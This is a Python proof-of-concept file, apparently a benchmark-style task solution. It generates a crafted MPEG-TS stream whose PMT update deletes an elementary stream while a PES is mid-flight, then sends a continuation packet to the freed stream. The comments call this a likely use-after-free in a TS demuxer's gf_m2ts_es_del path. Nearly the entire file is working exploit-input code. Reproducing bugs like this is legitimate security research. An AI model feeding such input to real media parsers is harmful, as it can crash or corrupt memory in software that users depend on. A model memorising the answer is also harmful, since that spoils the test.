import tarfile
from typing import List, Tuple, Dict


def _crc32_mpeg2(data: bytes) -> int:
    crc = 0xFFFFFFFF
    for b in data:
        crc ^= (b & 0xFF) << 24
        for _ in range(8):
            if crc & 0x80000000:
                crc = ((crc << 1) ^ 0x04C11DB7) & 0xFFFFFFFF
            else:
                crc = (crc << 1) & 0xFFFFFFFF
    return crc & 0xFFFFFFFF


def _pack_section_with_crc(section_wo_crc: bytes) -> bytes:
    crc = _crc32_mpeg2(section_wo_crc)
    return section_wo_crc + crc.to_bytes(4, "big")


def _make_pat_section(pmt_pid: int, ts_id: int = 1, program_number: int = 1, version: int = 0) -> bytes:
    # table_id + section_syntax_indicator/reserved + section_length + fields + program loop + CRC32
    program_info = program_number.to_bytes(2, "big") + bytes([0xE0 | ((pmt_pid >> 8) & 0x1F), pmt_pid & 0xFF])

    body = (
        ts_id.to_bytes(2, "big")
        + bytes([0xC0 | ((version & 0x1F) << 1) | 0x01])
        + b"\x00\x00"
        + program_info
    )

    section_length = len(body) + 4
    sec = bytes([0x00, 0xB0 | ((section_length >> 8) & 0x0F), section_length & 0xFF]) + body
    return _pack_section_with_crc(sec)


def _make_pmt_section(
    program_number: int,
    pcr_pid: int,
    streams: List[Tuple[int, int]],
    version: int = 0,
) -> bytes:
    # program_number + version byte + section_number + last_section_number + PCR_PID + program_info_length + streams + CRC32
    program_info_len = 0
    body = (
        program_number.to_bytes(2, "big")
        + bytes([0xC0 | ((version & 0x1F) << 1) | 0x01])
        + b"\x00\x00"
        + bytes([0xE0 | ((pcr_pid >> 8) & 0x1F), pcr_pid & 0xFF])
        + bytes([0xF0 | ((program_info_len >> 8) & 0x0F), program_info_len & 0xFF])
    )

    for stype, pid in streams:
        es_info_len = 0
        body += bytes([stype & 0xFF])
        body += bytes([0xE0 | ((pid >> 8) & 0x1F), pid & 0xFF])
        body += bytes([0xF0 | ((es_info_len >> 8) & 0x0F), es_info_len & 0xFF])

    section_length = len(body) + 4
    sec = bytes([0x02, 0xB0 | ((section_length >> 8) & 0x0F), section_length & 0xFF]) + body
    return _pack_section_with_crc(sec)


def _make_pes_start(stream_id: int = 0xE0) -> bytes:
    # Minimal PES header with no optional fields, packet_length = 0 (unbounded)
    return b"\x00\x00\x01" + bytes([stream_id & 0xFF]) + b"\x00\x00" + b"\x80\x00\x00"


def _make_ts_packet(pid: int, payload: bytes, pusi: bool, cc: int) -> bytes:
    pid &= 0x1FFF
    cc &= 0x0F
    b0 = 0x47
    b1 = ((1 if pusi else 0) << 6) | ((pid >> 8) & 0x1F)
    b2 = pid & 0xFF
    b3 = 0x10 | cc  # payload only
    header = bytes([b0, b1, b2, b3])

    if len(payload) > 184:
        payload = payload[:184]
    elif len(payload) < 184:
        payload = payload + (b"\xFF" * (184 - len(payload)))

    return header + payload


class Solution:
    def solve(self, src_path: str) -> bytes:
        # src_path is unused; PoC is a crafted MPEG-TS stream.
        # Sequence:
        # 1) PAT -> PMT PID
        # 2) PMT v0 declares ES PID 0x0100
        # 3) Start PES on PID 0x0100
        # 4) PMT v1 updates streams, removing PID 0x0100 and adding PID 0x0101 (triggers gf_m2ts_es_del)
        # 5) Continuation TS packet on PID 0x0100 (potential UAF on freed ES)
        pmt_pid = 0x0064
        prog_num = 1
        es_old = 0x0100
        es_new = 0x0101

        pat = _make_pat_section(pmt_pid=pmt_pid, ts_id=1, program_number=prog_num, version=0)
        pmt0 = _make_pmt_section(program_number=prog_num, pcr_pid=es_old, streams=[(0x1B, es_old)], version=0)
        pmt1 = _make_pmt_section(program_number=prog_num, pcr_pid=es_new, streams=[(0x0F, es_new)], version=1)

        cc: Dict[int, int] = {}

        def emit(pid: int, payload: bytes, pusi: bool) -> bytes:
            c = cc.get(pid, 0)
            cc[pid] = (c + 1) & 0x0F
            return _make_ts_packet(pid=pid, payload=payload, pusi=pusi, cc=c)

        packets = []
        packets.append(emit(0x0000, b"\x00" + pat, True))
        packets.append(emit(pmt_pid, b"\x00" + pmt0, True))

        pes0 = _make_pes_start(0xE0)
        packets.append(emit(es_old, pes0 + (b"A" * (184 - len(pes0))), True))

        packets.append(emit(pmt_pid, b"\x00" + pmt1, True))

        packets.append(emit(es_old, b"B" * 184, False))

        return b"".join(packets)